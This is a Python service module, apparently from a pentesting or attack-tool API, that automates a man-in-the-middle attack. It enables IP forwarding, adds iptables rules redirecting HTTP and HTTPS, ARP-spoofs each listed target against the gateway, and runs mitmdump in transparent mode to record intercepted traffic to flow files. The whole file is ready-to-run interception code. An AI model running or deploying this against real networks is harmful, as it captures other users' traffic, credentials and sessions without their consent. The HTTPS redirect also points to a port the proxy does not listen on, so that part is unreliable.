"""Service for Man-in-the-Middle via mitmproxy + ARP spoofing."""

import uuid
import asyncio
import logging
from typing import Optional
from app.config import settings
from app.models.schemas import MitmRequest
from app.utils.process_manager import process_manager

logger = logging.getLogger(__name__)


class MitmService:
    def __init__(self):
        self._active_session: Optional[dict] = None

    async def start(self, req: MitmRequest) -> dict:
        """
        Start MITM:
        1. Enable IP forwarding
        2. ARP spoof targets (arpspoof or ettercap)
        3. Start mitmproxy to intercept traffic
        """
        session_id = str(uuid.uuid4())[:8]
        log_file = str(settings.LOGS_DIR / f"mitm_{session_id}.log")
        flow_file = str(settings.CAPTURES_DIR / f"mitm_{session_id}.flow")

        # Enable IP forwarding
        await process_manager.run_sync(
            ["sysctl", "-w", "net.ipv4.ip_forward=1"], timeout=5
        )

        # iptables redirect HTTP(S) to mitmproxy
        for port_from, port_to in [("80", str(req.proxy_port)), ("443", str(req.proxy_port + 1))]:
            await process_manager.run_sync([
                "iptables", "-t", "nat", "-A", "PREROUTING",
                "-i", req.interface,
                "-p", "tcp", "--dport", port_from,
                "-j", "REDIRECT", "--to-port", port_to,
            ], timeout=5)

        # ARP spoof each target
        arp_tasks = []
        for target_ip in req.target_ips:
            arp_cmd = [
                "arpspoof",
                "-i", req.interface,
                "-t", target_ip,
                req.gateway,
            ]
            arp_tasks.append(asyncio.create_task(
                process_manager.run(arp_cmd, timeout=None)
            ))

        # Build mitmproxy command
        mitm_cmd = [
            "mitmproxy",
            "--mode", "transparent",
            "--listen-port", str(req.proxy_port),
            "--save-stream-file", flow_file,
            "--set", f"console_output_file={log_file}",
        ]

        if req.filter_hosts:
            host_filter = " | ".join(f"~d {h}" for h in req.filter_hosts)
            mitm_cmd.extend(["--set", f"view_filter={host_filter}"])

        # Start mitmproxy (non-interactive, use mitmdump for headless)
        mitm_cmd[0] = "mitmdump"  # Use headless version for API
        mitm_proc = await process_manager.run(mitm_cmd, timeout=None)

        self._active_session = {
            "id": session_id,
            "interface": req.interface,
            "gateway": req.gateway,
            "targets": req.target_ips,
            "proxy_port": req.proxy_port,
            "flow_file": flow_file,
            "log_file": log_file,
        }

        return self._active_session

    async def stop(self) -> dict:
        """Stop MITM and clean up."""
        # Kill processes
        for proc in ["mitmdump", "mitmproxy", "arpspoof"]:
            await process_manager.run_sync(["pkill", "-f", proc], timeout=5)

        # Flush iptables
        await process_manager.run_sync(["iptables", "-t", "nat", "-F"], timeout=5)

        # Disable IP forwarding
        await process_manager.run_sync(
            ["sysctl", "-w", "net.ipv4.ip_forward=0"], timeout=5
        )

        session = self._active_session
        self._active_session = None
        return {"stopped": True, "session": session}

    def status(self) -> dict:
        return {
            "active": self._active_session is not None,
            "session": self._active_session,
        }


mitm_service = MitmService()
